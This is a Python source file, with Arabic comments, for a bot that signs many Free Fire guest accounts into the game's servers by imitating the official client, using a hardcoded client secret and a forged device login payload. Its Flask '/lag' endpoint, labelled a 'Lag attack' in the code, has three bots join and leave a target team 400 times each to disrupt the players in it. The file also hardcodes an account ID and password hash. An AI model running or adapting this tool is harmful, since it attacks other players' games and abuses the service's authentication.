#بوت كامل من صنع ميرو متعوب عليه اكثر من شهرين 
#MERO IS KING
#TELEGRAM:@@meroXking
#INSTGRAM:@mero.antiban
import requests, os, sys, jwt, pickle, json, binascii, time, urllib3, base64, datetime, re, socket, threading
import asyncio
import random
from protobuf_decoder.protobuf_decoder import Parser
from byte import *
from byte import xSendTeamMsg
from byte import Auth_Chat
from xHeaders import *
from datetime import datetime
from google.protobuf.timestamp_pb2 import Timestamp
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import tempfile
import psutil
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  

# تطبيق Flask
app = Flask(__name__)

# DaTa SeT
connected_clients = {}
connected_clients_lock = threading.Lock()

def clean_text(text):
    if not text:
        return ""
    return str(text).replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')

def get_random_accounts(count=1):
    with connected_clients_lock:
        if not connected_clients:
            return []
        available_clients = list(connected_clients.values())
        if count >= len(available_clients):
            return available_clients
        return random.sample(available_clients, count)

def AuTo_ResTartinG():
    time.sleep(5 * 60 * 60)  # 5 ساعات
    print('\n - AuTo ResTartinG The BoT بعد 5 ساعات ... ! ')
    os.execv(sys.executable, [sys.executable] + sys.argv)
       
def ResTarT_BoT():
    print('\n - ResTartinG The BoT ... ! ')
    os.execv(sys.executable, [sys.executable] + sys.argv)

# LaG SET
def execute_lag_command(client, teamcode, user_id, client_number):
    success = False
    try:
        if hasattr(client, 'CliEnts2') and client.CliEnts2 and hasattr(client, 'key') and client.key and hasattr(client, 'iv') and client.iv:
            for i in range(400):
                try:
                    client.CliEnts2.send(JoinTeamCode(teamcode, client.key, client.iv))
                    client.CliEnts2.send(ExitBot('000000', client.key, client.iv))
                    time.sleep(0.1)
                except Exception as e:
                    break
            success = True
    except Exception as e:
        pass
    return success

# FF_CLient Class
class FF_CLient():
    def __init__(self, id, password):
        self.id = id
        self.password = password
        self.key = None
        self.iv = None
        self.Get_FiNal_ToKen_0115()     
            
    def Connect_SerVer_OnLine(self, Token, tok, host, port, key, iv, host2, port2):
        try:
            self.AutH_ToKen_0115 = tok    
            self.CliEnts2 = socket.create_connection((host2, int(port2)))
            self.CliEnts2.send(bytes.fromhex(self.AutH_ToKen_0115))                  
        except:
            pass
        
        while True:
            try:
                self.DaTa2 = self.CliEnts2.recv(99999)
                if '0500' in self.DaTa2.hex()[0:4] and len(self.DaTa2.hex()) > 30:
                    try:
                        self.packet = json.loads(DeCode_PackEt(f'08{self.DaTa2.hex().split("08", 1)[1]}'))
                        self.AutH = self.packet['5']['data']['7']['data']
                    except:
                        pass
            except:
                pass
                                                            
    def Connect_SerVer(self, Token, tok, host, port, key, iv, host2, port2):
        self.AutH_ToKen_0115 = tok    
        self.CliEnts = socket.create_connection((host, int(port)))
        self.CliEnts.send(bytes.fromhex(self.AutH_ToKen_0115))  
        self.DaTa = self.CliEnts.recv(1024)
        
        threading.Thread(target=self.Connect_SerVer_OnLine, args=(Token, tok, host, port, key, iv, host2, port2)).start()
        self.Exemple = xMsGFixinG('12345678')
        
        self.key = key
        self.iv = iv
        
        with connected_clients_lock:
            connected_clients[self.id] = self
        
        while True:
            try:
                self.DaTa = self.CliEnts.recv(1024)
                if len(self.DaTa) == 0 or (hasattr(self, 'DaTa2') and len(self.DaTa2) == 0):
                    try:
                        self.CliEnts.close()
                        if hasattr(self, 'CliEnts2'):
                            self.CliEnts2.close()
                        self.Connect_SerVer(Token, tok, host, port, key, iv, host2, port2)
                    except:
                        try:
                            self.CliEnts.close()
                            if hasattr(self, 'CliEnts2'):
                                self.CliEnts2.close()
                            self.Connect_SerVer(Token, tok, host, port, key, iv, host2, port2)
                        except:
                            self.CliEnts.close()
                            if hasattr(self, 'CliEnts2'):
                                self.CliEnts2.close()
                            ResTarT_BoT()
            except Exception as e:
                try:
                    self.CliEnts.close()
                    if hasattr(self, 'CliEnts2'):
                        self.CliEnts2.close()
                except:
                    pass
                self.Connect_SerVer(Token, tok, host, port, key, iv, host2, port2)
                                    
    def GeT_Key_Iv(self, serialized_data):
        my_message = xKEys.MyMessage()
        my_message.ParseFromString(serialized_data)
        timestamp, key, iv = my_message.field21, my_message.field22, my_message.field23
        timestamp_obj = Timestamp()
        timestamp_obj.FromNanoseconds(timestamp)
        timestamp_seconds = timestamp_obj.seconds
        timestamp_nanos = timestamp_obj.nanos
        combined_timestamp = timestamp_seconds * 1_000_000_000 + timestamp_nanos
        return combined_timestamp, key, iv

    def Guest_GeneRaTe(self, uid, password):
        self.url = "https://100067.connect.garena.com/oauth/guest/token/grant"
        self.headers = {
            "Host": "100067.connect.garena.com",
            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close"
        }
        self.dataa = {
            "uid": f"{uid}",
            "password": f"{password}",
            "response_type": "token",
            "client_type": "2",
            "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
            "client_id": "100067"
        }
        
        try:
            if not uid or not password:
                print(f"❌ بيانات الحساب غير صالحة: {uid}")
                time.sleep(5)
                return self.Guest_GeneRaTe(uid, password)
                
            self.response = requests.post(self.url, headers=self.headers, data=self.dataa, timeout=30)
            
            if self.response.status_code != 200:
                print(f"❌ خطأ في الاستجابة: {self.response.status_code}")
                time.sleep(5)
                return self.Guest_GeneRaTe(uid, password)
                
            response_data = self.response.json()
            
            if 'access_token' not in response_data or 'open_id' not in response_data:
                print(f"❌ بيانات الاستجابة غير مكتملة: {response_data}")
                time.sleep(5)
                return self.Guest_GeneRaTe(uid, password)
            
            self.Access_ToKen = response_data['access_token']
            self.Access_Uid = response_data['open_id']
            
            print(f'✅ تم الحصول على التوكن للحساب: {uid}')
            time.sleep(0.5)

            return self.ToKen_GeneRaTe(self.Access_ToKen, self.Access_Uid)
            
        except requests.exceptions.RequestException as e:
            print(f"❌ خطأ في الاتصال للحساب {uid}: {e}")
            time.sleep(5)
            return self.Guest_GeneRaTe(uid, password)
        except Exception as e:
            print(f"❌ خطأ غير متوقع للحساب {uid}: {e}")
            time.sleep(2)
            return self.Guest_GeneRaTe(uid, password)
                                        
    def GeT_LoGin_PorTs(self, JwT_ToKen, PayLoad):
        self.UrL = 'https://clientbp.ggblueshark.com/GetLoginData'
        self.HeadErs = {
            'Expect': '100-continue',
            'Authorization': f'Bearer {JwT_ToKen}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': 'OB51',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
            'Host': 'clientbp.ggblueshark.com',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        
        try:
            self.Res = requests.post(self.UrL, headers=self.HeadErs, data=PayLoad, verify=False, timeout=30)
            
            if self.Res.content:
                hex_content = self.Res.content.hex()
                try:
                    self.BesTo_data = json.loads(DeCode_PackEt(hex_content))  
                    address = self.BesTo_data['32']['data'] 
                    address2 = self.BesTo_data['14']['data']
                    
                    ip = address[:len(address) - 6] 
                    ip2 = address2[:len(address) - 6]
                    port = address[len(address) - 5:] 
                    port2 = address2[len(address2) - 5:]
                    
                    return ip, port, ip2, port2
                except Exception as e:
                    print(f"❌ خطأ في معالجة بيانات البورت: {e}")
                    return None, None, None, None
            else:
                print("❌ لا توجد بيانات في الاستجابة")
                return None, None, None, None
                
        except requests.RequestException as e:
            print(f"❌ خطأ في طلب البورتات: {e}")
            return None, None, None, None
        except Exception as e:
            print(f"❌ خطأ غير متوقع في طلب البورتات: {e}")
            return None, None, None, None
        
    def ToKen_GeneRaTe(self, Access_ToKen, Access_Uid):
        self.UrL = "https://loginbp.common.ggbluefox.com/MajorLogin"
        self.HeadErs = {
            'X-Unity-Version': '2018.4.11f1',
            'ReleaseVersion': 'OB51',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-GA': 'v1 1',
            'Content-Length': '928',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
            'Host': 'loginbp.ggblueshark.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        
        # base_data مصححة بدون أخطاء hex
        base_data = '1a13323032352d31302d33312030353a31383a3235220966726565206669726528013a07312e3131382e344232416e64726f6964204f532039202f204150492d3238202850492f72656c2e636a772e32303232303531382e313134313333294a0848616e6468656c64520c4d544e2f537061636574656c5a045749464960800a68d00572033234307a2d7838365f3634205353453320535345342e3120535345342e32204156582041565832207c2032343030207c20348001e61e8a010f416472656e6f2028544d292036343092010d4f70656e474c20455320332e329a012b476f6f676c657c36323566373136665f393161375f343935625f396631365f303866653964336336353333a2010d3137362e32382e3133352e3233aa01026172b201203433303632343537393364653836646134323561353263616164663231656564ba010134c2010848616e6468656c64ca010d4f6e65506c7573204135303130ea014034653739616666653331343134393031353434656161626562633437303537333866653638336139326464346335656533646233333636326232653936363466f00101ca020c4d544e2f537061636574656cd2020457494649ca03203161633462383065636630343738613434323033626638666163363132306635e003b5ee02e803ff8502f003af13f803840780048c95028804b5ee0290048c95029804b5ee02b00404c80401d2043d2f646174612f6170702f636f6d2e6474732e667265656669726574685f66705843537068495636644b43376a4c5f574f7952413d3d2f6c69622f61726de00401ea045f65363261623933353464386662356662303831646233333861636233333439317c2f646174612f6170702f636f6d2e6474732e667265656669726574685f66705843537068495636644b43376a4c5f574f7952413d3d2f626173652e61706bf00406f804018a050233329a050a32303139313139303236a80503b205094f70656e474c455332b805ff01c00504e005c466ea05093372645f7061727479f80583e4068806019006019a060134a2060134b2062211541141595f58011f53594c59584056143a5f535a525c6b5c04096e595c3b000e61'
        
        try:
            # تنظيف البيانات من الأحرف غير المرغوب فيها
            cleaned_base_data = ''.join(c for c in base_data if c in '0123456789abcdef')
            self.dT = bytes.fromhex(cleaned_base_data)
            
            current_time = str(datetime.now())[:-7].encode()
            self.dT = self.dT.replace(b'2025-10-31 05:18:25', current_time)
            
            # تنظيف التوكن من الأحرف غير المرغوب فيها
            clean_token = ''.join(c for c in Access_ToKen if c.isalnum())
            clean_uid = ''.join(c for c in Access_Uid if c.isalnum())
            
            self.dT = self.dT.replace(b'4e79affe31414901544eaabebc4705738fe683a92dd4c5ee3db33662b2e9664f', clean_token.encode())
            self.dT = self.dT.replace(b'4306245793de86da425a52caadf21eed', clean_uid.encode())
            
            try:
                hex_data = self.dT.hex()
                # تنظيف البيانات قبل التشفير
                clean_hex_data = ''.join(c for c in hex_data if c in '0123456789abcdef')
                if len(clean_hex_data) % 2 == 0:  # التأكد من أن الطول زوجي
                    encoded_data = EnC_AEs(clean_hex_data)
                    if encoded_data and all(c in '0123456789abcdef' for c in encoded_data):
                        self.PaYload = bytes.fromhex(encoded_data)
                    else:
                        print("❌ بيانات مشفرة غير صالحة")
                        self.PaYload = self.dT
                else:
                    print("❌ طول البيانات غير صحيح")
                    self.PaYload = self.dT
            except Exception as encoding_error:
                print(f"❌ خطأ في التشفير: {encoding_error}")
                self.PaYload = self.dT
        
        except ValueError as e:
            print(f"❌ خطأ في تحويل البيانات: {e}")
            # استخدام بديل أبسط في حالة الخطأ
            self.PaYload = f"uid={Access_Uid}&token={Access_ToKen}".encode()
        
        try:
            self.ResPonse = requests.post(self.UrL, headers=self.HeadErs, data=self.PaYload, verify=False, timeout=30)
            
            if self.ResPonse.status_code == 200 and len(self.ResPonse.text) > 10:
                try:
                    if self.ResPonse.content:
                        hex_content = self.ResPonse.content.hex()
                        self.BesTo_data = json.loads(DeCode_PackEt(hex_content))
                        self.JwT_ToKen = self.BesTo_data['8']['data']
                        self.combined_timestamp, self.key, self.iv = self.GeT_Key_Iv(self.ResPonse.content)
                        ip, port, ip2, port2 = self.GeT_LoGin_PorTs(self.JwT_ToKen, self.PaYload)
                        return self.JwT_ToKen, self.key, self.iv, self.combined_timestamp, ip, port, ip2, port2
                    else:
                        print("❌ لا توجد بيانات في استجابة التوكن")
                        raise Exception("No data in token response")
                except Exception as e:
                    print(f"❌ خطأ في تحليل استجابة التوكن: {e}")
                    time.sleep(2)
                    return self.ToKen_GeneRaTe(Access_ToKen, Access_Uid)
            else:
                print(f"❌ خطأ في استجابة التوكن، الحالة: {self.ResPonse.status_code}")
                time.sleep(2)
                return self.ToKen_GeneRaTe(Access_ToKen, Access_Uid)
                
        except requests.RequestException as e:
            print(f"❌ خطأ في طلب التوكن: {e}")
            time.sleep(5)
            return self.ToKen_GeneRaTe(Access_ToKen, Access_Uid)
        except Exception as e:
            print(f"❌ خطأ غير متوقع في طلب التوكن: {e}")
            time.sleep(2)
            return self.ToKen_GeneRaTe(Access_ToKen, Access_Uid)
      
    def Get_FiNal_ToKen_0115(self):
        try:
            result = self.Guest_GeneRaTe(self.id, self.password)
            if not result:
                print("❌ فشل في الحصول على التوكنات، إعادة المحاولة...")
                time.sleep(2)
                return self.Get_FiNal_ToKen_0115()
                
            token, key, iv, Timestamp, ip, port, ip2, port2 = result
            
            if not all([ip, port, ip2, port2]):
                print("❌ فشل في الحصول على البورتات، إعادة المحاولة...")
                time.sleep(2)
                return self.Get_FiNal_ToKen_0115()
                
            self.JwT_ToKen = token
            try:
                self.AfTer_DeC_JwT = jwt.decode(token, options={"verify_signature": False})
                self.AccounT_Uid = self.AfTer_DeC_JwT.get('account_id')
                self.EncoDed_AccounT = hex(self.AccounT_Uid)[2:]
                self.HeX_VaLue = DecodE_HeX(Timestamp)
                self.TimE_HEx = self.HeX_VaLue
                self.JwT_ToKen_ = token.encode().hex()
            except Exception as e:
                print(f"❌ خطأ في فك التوكن: {e}")
                time.sleep(2)
                return self.Get_FiNal_ToKen_0115()
                
            try:
                self.Header = hex(len(EnC_PacKeT(self.JwT_ToKen_, key, iv)) // 2)[2:]
                length = len(self.EncoDed_AccounT)
                self.__ = '00000000'
                if length == 9: self.__ = '0000000'
                elif length == 8: self.__ = '00000000'
                elif length == 10: self.__ = '000000'
                elif length == 7: self.__ = '000000000'
                else:
                    print('Unexpected length encountered')
                self.Header = f'0115{self.__}{self.EncoDed_AccounT}{self.TimE_HEx}00000{self.Header}'
                self.FiNal_ToKen_0115 = self.Header + EnC_PacKeT(self.JwT_ToKen_, key, iv)
            except Exception as e:
                print(f"❌ خطأ في التوكن النهائي: {e}")
                time.sleep(5)
                return self.Get_FiNal_ToKen_0115()
                
            self.AutH_ToKen = self.FiNal_ToKen_0115
            self.Connect_SerVer(self.JwT_ToKen, self.AutH_ToKen, ip, port, key, iv, ip2, port2)
            return self.AutH_ToKen, key, iv
            
        except Exception as e:
            print(f"❌ خطأ في Get_FiNal_ToKen_0115: {e}")
            time.sleep(10)
            return self.Get_FiNal_ToKen_0115()

#AcSS MeRo SeT
ACCOUNTS = []

def load_accounts_from_file(filename="accs.txt"):
    accounts = []
    try:
        with open(filename, "r", encoding="utf-8") as file:
            for line in file:
                line = line.strip()
                if line and not line.startswith("#"):
                    if ":" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            account_id = parts[0].strip()
                            password = parts[1].strip()
                            accounts.append({'id': account_id, 'password': password})
                    else:
                        accounts.append({'id': line.strip(), 'password': ''})
        print(f"تم تحميل {len(accounts)} حساب من {filename}")
    except FileNotFoundError:
        print(f"ملف {filename} غير موجود!")
    except Exception as e:
        print(f"حدث خطأ أثناء قراءة الملف: {e}")
    
    return accounts

ACCOUNTS = load_accounts_from_file()

if not ACCOUNTS:
    ACCOUNTS = [{'id': '4173444648', 'password': '6F0D6506AE64A0B02657DE5CFAFF3988E3D2A3EE28C2B83AF54591D925606140'}]

def start_account(account):
    try:
        FF_CLient(account['id'], account['password'])
    except Exception as e:
        print(f"❌ Error starting account {account['id']}: {e}")
        time.sleep(2)
        start_account(account)

# Flask Routes
@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "message": "MERO KING BOT - Flask API",
        "endpoints": {
            "/lag": "تنفيذ هجوم Lag على فريق - استخدم: /lag?teamcode=12345678",
            "/status": "حالة البوت والحسابات المتصلة",
            "/health": "فحص صحة التطبيق"
        }
    })

@app.route('/health')
def health_check():
    with connected_clients_lock:
        accounts_count = len(connected_clients)
    
    return jsonify({
        "status": "healthy",
        "connected_accounts": accounts_count,
        "timestamp": datetime.now().isoformat()
    }), 200

@app.route('/lag')
def handle_lag_api():
    try:
        teamcode = request.args.get('teamcode')
        
        if not teamcode:
            return jsonify({
                "status": "error",
                "message": "يرجى إدخال teamcode",
                "example": "/lag?teamcode=12345678"
            }), 400
        
        if not ChEck_Commande(teamcode):
            return jsonify({
                "status": "error", 
                "message": "teamcode غير صالح"
            }), 400
        
        print(f"⏳ جاري تنفيذ أمر Lag عبر API للفريق: {teamcode}")
        
        clients_list = get_random_accounts(3)
        
        if not clients_list:
            return jsonify({
                "status": "error",
                "message": "لا توجد حسابات متصلة حالياً"
            }), 500
            
        success_count = 0
        threads = []
        results = []
        
        for i, client in enumerate(clients_list, 1):
            thread = threading.Thread(
                target=lambda c=client, r=results: r.append(
                    execute_lag_command(c, teamcode, "api_user", i)
                )
            )
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join(timeout=30)
        
        success_count = sum(results)
        
        return jsonify({
            "status": "success",
            "message": "تم الانتهاء من عملية Lag",
            "teamcode": teamcode,
            "accounts_used": len(clients_list),
            "successful_attacks": success_count,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"حدث خطأ: {str(e)}"
        }), 500

@app.route('/status')
def status():
    with connected_clients_lock:
        accounts_count = len(connected_clients)
        accounts_list = list(connected_clients.keys())
    
    return jsonify({
        "status": "online",
        "connected_accounts": accounts_count,
        "accounts_list": accounts_list[:10],
        "total_loaded_accounts": len(ACCOUNTS),
        "server_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })

# تشغيل الحسابات
def start_accounts():
    print("⏳ جاري بدء تشغيل الحسابات...")
    
    if not ACCOUNTS:
        print("❌ لا توجد حسابات لبدء التشغيل!")
        return
    
    accounts_to_start = ACCOUNTS[:50]  # تحديد عدد الحسابات
    print(f"🔧 سيتم تشغيل {len(accounts_to_start)} حساب من أصل {len(ACCOUNTS)}")
    
    for i, account in enumerate(accounts_to_start, 1):
        try:
            print(f"🚀 بدء الحساب {i}: {account['id']}")
            threading.Thread(target=start_account, args=(account,), daemon=True).start()
            time.sleep(0.5)  # زيادة التأخير بين الحسابات
        except Exception as e:
            print(f"❌ خطأ في بدء الحساب {account['id']}: {e}")

# التشغيل الرئيسي المعدل للسحابة
def StarT_SerVer():
    try:
        print(f"🕒 بدء التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("⏰ سيتم عمل restart تلقائي كل 5 ساعات")
        
        # الحصول على البورت من متغيرات البيئة
        port = int(os.environ.get("PORT", 5000))
        host = os.environ.get("HOST", "0.0.0.0")
        
        print(f"🌐 خادم Flask يعمل على: http://{host}:{port}")
        
        start_accounts()
        threading.Thread(target=AuTo_ResTartinG, daemon=True).start()
        
        print(f"✅ تم بدء تشغيل النظام بالكامل بنجاح")
        print(f"📊 عدد الحسابات المحملة: {len(ACCOUNTS)}")
        
        # تشغيل خادم Flask مع الإعدادات المناسبة للسحابة
        app.run(host=host, port=port, debug=False, use_reloader=False)
        
    except Exception as e:
        print(f"❌ خطأ في بدء التشغيل: {e}")
        print("🔄 إعادة تشغيل النظام...")
        time.sleep(10)
        ResTarT_BoT()

if __name__ == "__main__":
    try:
        # إعدادات السحابة
        port = int(os.environ.get("PORT", 5000))
        host = os.environ.get("HOST", "0.0.0.0")
        
        print(f"🚀 بدء التشغيل على {host}:{port}")
        StarT_SerVer()
    except KeyboardInterrupt:
        print("⏹️ تم إوقف التطبيق بواسطة المستخدم")
    except Exception as e:
        print(f"💥 خطأ غير متوقع: {e}")
        sys.exit(1)
